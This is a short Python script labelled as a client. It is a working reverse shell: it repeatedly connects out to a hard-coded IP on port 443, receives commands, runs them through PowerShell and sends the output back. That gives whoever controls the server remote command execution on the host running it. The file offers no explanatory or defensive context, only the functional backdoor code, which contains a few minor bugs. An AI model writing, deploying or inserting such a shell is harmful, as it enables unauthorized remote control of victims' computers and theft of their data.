#Client
import socket
import subprocess
import time
import os


server_ip = "192.168.1.11"
serer_port= 443
end_result = "<Last_string>"
while True:
    try:
        client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        server_socket = (server_ip,serer_port)
        print(f"Connecting to {server_ip}")
        client_socket.connect(server_socket)
        while True:

            command = client_socket.recv(1024)
            command_dec = command.decode()
            if command_dec == "exit":
                client_socket.close()
                break
            elif command_dec == "":
                continue

            elif command_dec.startswith("cd"):
                path = command_dec.strip("cd ")
                if os.path.exists(path):
                    os.chdir(path)
                    continue
                else:
                    print("Invalid path")
                    continue
            elif len(command_dec)==2 and command_dec[0].isalpha and command_dec[1] == ":":
                os.chdir(command_dec)
                continue

            command_result = subprocess.run(["powershell.exe",command_dec],shell=True,capture_output=True,stdin=subprocess.DEVNULL)
            if command_result.stderr.decode("utf-8")=="":
                result = command_result.stdout
                result = result.decode("utf-8") + end_result
                result = result.encode("utf-8")
            elif command_result.stderr.decode("utf-8") != "":
                result = command_result.stderr
                result = result.decode("utf-8") + end_result
                result = result.encode("utf-8")
            client_socket.sendall(result)
        break
    except Exception:
        print(f"Couldn't connect to {server_ip}")
        time.sleep(6)